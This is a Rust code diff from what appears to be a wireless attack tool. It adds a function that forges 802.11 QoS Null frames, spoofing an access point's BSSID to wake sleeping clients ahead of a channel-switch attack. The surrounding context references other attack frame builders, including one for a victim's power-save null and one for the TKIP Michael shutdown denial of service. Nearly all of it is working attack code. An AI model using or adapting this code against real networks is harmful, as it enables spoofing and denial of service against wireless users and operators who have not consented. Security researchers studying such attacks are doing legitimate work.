@@ -650,6 +650,43 @@ pub fn build_power_save_null(victim_mac: &MacAddress, bssid: &MacAddress) -> Vec
     buf
 }
 
+/// Build a QoS Null Data frame for client stimulation.
+///
+/// Spoofed from AP (FromDS=1) with MoreData=1 flag. When a client receives this,
+/// it thinks the AP has buffered frames and wakes its radio to poll for them.
+/// The AP has no actual data — the client stays associated but becomes active.
+///
+/// This is a non-disruptive way to force sleeping mobile clients to transmit,
+/// making them visible to the scanner and triggering association state checks.
+/// Used by the CSA attack to wake clients before sending CSA beacons.
+///
+/// Frame structure (26 bytes):
+///   FC(2) + Duration(2) + DA(6) + BSSID(6) + SA(6) + SeqCtl(2) + QoS(2)
+///
+/// # Arguments
+/// * `da` — Destination: broadcast or specific client MAC
+/// * `bssid` — AP BSSID to spoof as sender
+pub fn build_qos_null_stimulation(da: &MacAddress, bssid: &MacAddress) -> Vec<u8> {
+    let mut buf = Vec::with_capacity(26);
+    // FC byte 0: QoS Null = Data type (0x08) | QoS Null subtype (0xC0) = 0xC8
+    buf.push(0xC8);
+    // FC byte 1: FromDS=1 (0x02) | MoreData=1 (0x20) = 0x22
+    buf.push(ieee80211::fc_flags::FROM_DS | ieee80211::fc_flags::MORE_DATA);
+    // Duration
+    buf.extend_from_slice(&[0x00, 0x00]);
+    // Addr1 = DA (receiver — broadcast or specific client)
+    buf.extend_from_slice(da.as_bytes());
+    // Addr2 = BSSID (transmitter — spoofed AP)
+    buf.extend_from_slice(bssid.as_bytes());
+    // Addr3 = SA (source = AP BSSID in FromDS frames)
+    buf.extend_from_slice(bssid.as_bytes());
+    // Sequence Control
+    buf.extend_from_slice(&[0x00, 0x00]);
+    // QoS Control (2 bytes) — TID 0, normal ack policy
+    buf.extend_from_slice(&[0x00, 0x00]);
+    buf
+}
+
 /// Build a QoS Data frame with intentionally bad TKIP MIC (Michael shutdown attack).
 ///
 /// TKIP spec requires AP to shut down for 60 seconds after detecting 2 MIC failures
